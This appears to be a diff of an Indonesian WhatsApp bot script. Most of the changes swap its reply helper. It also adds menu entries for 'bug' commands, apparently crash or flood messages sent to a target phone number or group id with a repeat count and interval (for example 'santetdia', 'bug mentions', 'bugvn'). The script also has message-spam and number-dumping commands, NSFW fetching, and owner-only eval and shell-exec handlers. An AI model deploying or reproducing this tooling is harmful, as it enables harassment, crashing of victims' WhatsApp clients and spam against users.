+haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => anjay(jsonformat('*error*')))
 }
 break
 //=================================================//
@@ -2829,7 +2701,7 @@ if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
 if (!isAdmins) throw sticAdmin(from)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
 }
 break
 //=================================================//
@@ -2841,7 +2713,7 @@ if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
 if (!isAdmins) throw sticAdmin(from)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
 }
 break
 //=================================================//
@@ -2890,13 +2762,13 @@ break
 case 'nsfw': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
-if (!isBotAdmins) return m.reply(mess.botAdmin)
-if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (!m.isGroup) return anjay(mess.group)
+if (!isBotAdmins) return anjay(mess.botAdmin)
+if (!isAdmins && !isCreator) return anjay(mess.admin)
 if (args[0] === "on") {
-if (AntiNsfw) return m.reply('Sudah Aktif')
+if (AntiNsfw) return anjay('Sudah Aktif')
 ntnsfw.push(from)
-m.reply('Sukses Telah mengaktifkan Nsfw Di group Ini')
+anjay('Sukses Telah mengaktifkan Nsfw Di group Ini')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -2905,10 +2777,10 @@ mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
-if (!AntiNsfw) return m.reply('Sudah Non Aktif')
+if (!AntiNsfw) return anjay('Sudah Non Aktif')
 let off = ntnsfw.indexOf(from)
 ntnsfw.splice(off, 1)
-m.reply('Sukses Mematikan Nsfw di group ini')
+anjay('Sukses Mematikan Nsfw di group ini')
 } else {
 let buttonsntnsfw = [
 { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
@@ -2926,7 +2798,7 @@ break
 case 'trap' :
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
+if (!m.isGroup) return anjay(mess.group)
 if (!AntiNsfw) return reply(mess.nsfw)
 reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)
@@ -2947,7 +2819,7 @@ case 'hentai-neko' :
 case 'hneko' :
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
+if (!m.isGroup) return anjay(mess.group)
 if (!AntiNsfw) return reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
  let hnekobot = [
@@ -2967,7 +2839,7 @@ case 'hentai-waifu' :
 case 'nwaifu' :
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
+if (!m.isGroup) return anjay(mess.group)
 if (!AntiNsfw) return reply(mess.nsfw)
 reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
@@ -3008,7 +2880,7 @@ case 'penjara':
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
+if (!q) return anjay(`*Contoh* :\n#penjara namagroup`)
 let cret = await haikal.groupCreate(args.join(" "), [])
 let response = await haikal.groupInviteCode(cret.id)
 teks = `「 *Create Group* 」
@@ -3018,7 +2890,7 @@ _▸ Owner : @${cret.owner.split("@")[0]}_
 _▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
 https://chat.whatsapp.com/${response}
 `
-m.reply(teks)
+anjay(teks)
 break
 case 'setppbot': {
 if (!isCreator) return
@@ -3035,8 +2907,8 @@ const { generateProfilePicture } = require("./baseikal/lib/myfunc")
 var { img } = await generateProfilePicture(media)
 await haikal.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
 } else { await haikal.updateProfilePicture(botNumber, { url: media }) }
-m.reply(mess.success)
-} catch { m.reply('Gagal Mengganti Photo Profile') }
+anjay(mess.success)
+} catch { anjay('Gagal Mengganti Photo Profile') }
 }
 break
 case 'setppgroup': case 'setppgrup': case 'setppgc': {
@@ -3055,8 +2927,8 @@ const { generateProfilePicture } = require("./baseikal/lib/myfunc")
 var { img } = await generateProfilePicture(media)
 await haikal.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
 } else { await haikal.updateProfilePicture(m.chat, { url: media }) }
-m.reply(mess.success)
-} catch { m.reply('Gagal Mengganti Photo Profile') }
+anjay(mess.success)
+} catch { anjay('Gagal Mengganti Photo Profile') }
 }
 break
 //=================================================//
@@ -3491,8 +3363,8 @@ case 'spam': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.quoted) return m.reply("Reply pesanya!")
-if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+if (!m.quoted) return anjay("Reply pesanya!")
+if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
 quoted.copyNForward(m.chat, true)
@@ -3520,8 +3392,8 @@ await fs.unlinkSync(FaTiH)
 case 'smeme': case 'stickermeme': case 'stickmeme': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
-if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
+if (text.includes('|')) return anjay(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
+if (!/image/.test(mime)) return anjay(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
 sticWait(from)
 arg = args.join(' ')
 mee = await haikal.downloadAndSaveMediaMessage(quoted)
@@ -4913,7 +4785,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 var teks = body.slice(6)
-if (!teks) return m.reply("lah?")
+if (!teks) return anjay("lah?")
 var numberPattern = /\d+/g;
 var nomer = teks.match(numberPattern)
 var random_length = teks.length - nomer[0].length;
@@ -4957,7 +4829,7 @@ nomerny += `NO: wa.me/${m.quoted.sender("@")[0]}\nBIO: ${bionye.status}\n\n`
 console.log(i)
     }
 }
-m.reply(nomerny)
+anjay(nomerny)
 console.log("Done dump")
 break
 case 'ping': case 'botstatus': case 'statusbot': {
@@ -5030,12 +4902,12 @@ break
 case 'kalkulator': case 'kal': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
+if (args.length < 1) return anjay(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
 let qsd = args.join(" ")
 if (typeof mathjs.evaluate(qsd) !== 'number') {
-m.reply('Error')
+anjay('Error')
 } else {
-m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
+anjay(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
 }
 }
 break
@@ -5056,18 +4928,18 @@ if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) return groupon(from)
 if (!isAdmins && !isCreator) return sticAdmin(from)
-if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
+if (args.length < 1) return anjay('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
-if (AntiLink) return m.reply('Sudah Aktif')
+if (AntiLink) return anjay('Sudah Aktif')
 ntilink.push(from)
-m.reply('Succes menyalakan antilink di group ini 🌷')
+anjay('Succes menyalakan antilink di group ini 🌷')
 } else if (args[0] === "off") {
-if (!AntiLink) return m.reply('Sudah Mati')
+if (!AntiLink) return anjay('Sudah Mati')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
-m.reply('Succes mematikan antilink di group ini 🌷')
+anjay('Succes mematikan antilink di group ini 🌷')
 } else {
-m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
+anjay('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
 case 'bugghoib': {
@@ -5077,9 +4949,9 @@ if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) return groupon(from)
 if (!isAdmins && !isCreator) return sticAdmin(from)
 if (args[0] === "on") {
-if (welcm) return m.reply('Sudah Aktif')
+if (welcm) return anjay('Sudah Aktif')
 wlcm.push(from)
-m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
+anjay('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -5088,10 +4960,10 @@ mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
-if (!welcm) return m.reply('Sudah Non Aktif')
+if (!welcm) return anjay('Sudah Non Aktif')
 let off = wlcm.indexOf(from)
 wlcm.splice(off, 1)
-m.reply('Sukses Mematikan Bug Ghoib di group ini')
+anjay('Sukses Mematikan Bug Ghoib di group ini')
 } else {
 let buttonsntnsfww = [
 { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
@@ -5489,7 +5361,7 @@ case 'cowner': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
+if (!args[0]) return anjay(`*Example* : #cowner add 628xxxx`)
 if (args[1]) {
 orgnye = args[1]
 } else if (m.quoted) {
@@ -5497,16 +5369,16 @@ orgnye = m.quoted.sender.split("@")[0]
 }
 const isCwner = owner.includes(orgnye)
 if (args[0] === "add") {
-if (isCwner) return m.reply('User sudah menjadi owner')
+if (isCwner) return anjay('User sudah menjadi owner')
 owner.push(orgnye)
-m.reply(`Succes add friends`)
+anjay(`Succes add friends`)
 } else if (args[0] === "del") {
-if (!isCwner) return m.reply('User bukan owner')
+if (!isCwner) return anjay('User bukan owner')
 let delcwner = owner.indexOf(orgnye)
 owner.splice(delcwner, 1)
-m.reply(`Succes del friends`)
+anjay(`Succes del friends`)
 } else {
-m.reply("Error")
+anjay("Error")
 }
 }
 break
@@ -5516,7 +5388,7 @@ if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 if (qtod === "true") {
 namenye = await haikal.getName(m.quoted.sender)
-m.reply(namenye)
+anjay(namenye)
 } else if (qtod === "false") {
 haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
 }
@@ -5867,9 +5739,27 @@ Bug Cr Vip [ true / false ]
 bugghoib [ on / off ]
 
 spam [ Reply Bug For Spam ]
-senbug [ Bug Pilihan ]
-bugvip [ Bug Pilihan ]
 
+ha [ bugvn ]
+hi [ bugvn ]
+hu [ bugvn ]
+he [ bugvn ]
+ba [ bugvn ]
+be [ bugvn ]
+bu [ bugvn ]
+bi [ bugvn ]
+ca [ bugvn ]
+ci [ bugvn ]
+cu [ bugvn ]
+co [ bugvn ]
+bug1 [ bug mentions ]
+bug2 [ bug mentions ]
+bug3 [ bug mentions ]
+bug4 [ bug mentions ]
+bug5 [ bug mentions ]
+bug6 [ bug mentions ]
+bug7 [ bug mentions ]
+poll [ bug vote ]
 gaskal [ Abis Kirim Gaskal Kasih Reactions ]
 bugtag [ Bug Yang Sambil Ngetag ]
 inibug [ Bug Tagall ]
@@ -5890,7 +5780,7 @@ jadibug3 [ Reply Audio Jadi Bug Vn ]
 jadibug4 [ Reply Sticker Jadi Bug Gambar ]
 jadibug5 [ Reply Gambar Jadi Bug Once ] 
 bugstik [ Contoh : Bugstik 5 ]
-bugie [ Contoh : Bugstik 5 ]
+bugie [ Contoh : Bugie 5 ]
 buglokas [ Bug Lokasi ]
 bugsange [ Bug Vip Yang Harus Menjadi Admin ]
 bugtod [ Bug Contact ]
@@ -5903,6 +5793,9 @@ bugbctext [ Bug Text Broadcast ]
 
 Only For You : > m.chat to get group id ❤️
 
+jagoanom [ reply nomor target ]
+santetdia [ Contoh : santetdia 628xxx@s.whatsapp.net|10|10s ]
+santetgc [ Contoh : santetgc 1237891xxxx@g.us|10|10s ]
 ampas1  [ Contoh : Ampas1 628xxx ]
 ampas2 [Contoh : Ampas2 112674448xxx ]
 catalogpc [ Contoh : catalogpc 628xxx@s.whatsapp.net|10|10s ]
@@ -6563,24 +6456,24 @@ sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
 if (sat == undefined) {
 bang = util.format(sul)}
-return bangkal(bang)}
+return anjay(bang)}
 try {
 m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
 } catch (e) {
-bangkal(String(e))}}
+anjay(String(e))}}
 if (budy.startsWith('>')) {
 if (!isCreator) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await bangkal(evaled)
+await anjay(evaled)
 } catch (err) {
-await bangkal(String(err))}}
+await anjay(String(err))}}
 if (budy.startsWith('$')) {
 if (!isCreator) return 
 exec(budy.slice(2), (err, stdout) => {
-if(err) return bangkal(err)
-if (stdout) return bangkal(stdout)})}
+if(err) return anjay(err)
+if (stdout) return anjay(stdout)})}
 //=================================================//
 //=================================================//
 if (isCmd && budy.toLowerCase() != undefined) {
